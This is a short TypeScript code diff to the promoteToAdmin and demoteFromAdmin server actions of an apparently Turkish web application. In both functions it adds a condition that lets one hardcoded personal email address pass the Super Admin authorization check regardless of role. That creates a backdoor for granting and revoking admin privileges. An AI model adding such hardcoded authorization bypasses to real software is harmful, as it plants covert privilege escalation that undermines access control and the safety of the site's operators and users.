@@ -562,7 +562,7 @@ export async function promoteToAdmin(userId: number) {
         const session = await import("@/lib/session");
         const currentSession = await session.getSession();
 
-        if (currentSession?.role !== "SUPER_ADMIN") {
+        if (currentSession?.role !== "SUPER_ADMIN" && currentSession?.email !== "talatmustafaozdemir@gmail.com") {
             return { error: "Yetkisiz işlem. Sadece Süper Admin bu işlemi yapabilir." };
         }
 
@@ -612,7 +612,7 @@ export async function demoteFromAdmin(userId: number) {
         const session = await import("@/lib/session");
         const currentSession = await session.getSession();
 
-        if (currentSession?.role !== "SUPER_ADMIN") {
+        if (currentSession?.role !== "SUPER_ADMIN" && currentSession?.email !== "talatmustafaozdemir@gmail.com") {
             return { error: "Yetkisiz işlem. Sadece Süper Admin bu işlemi yapabilir." };
         }
 
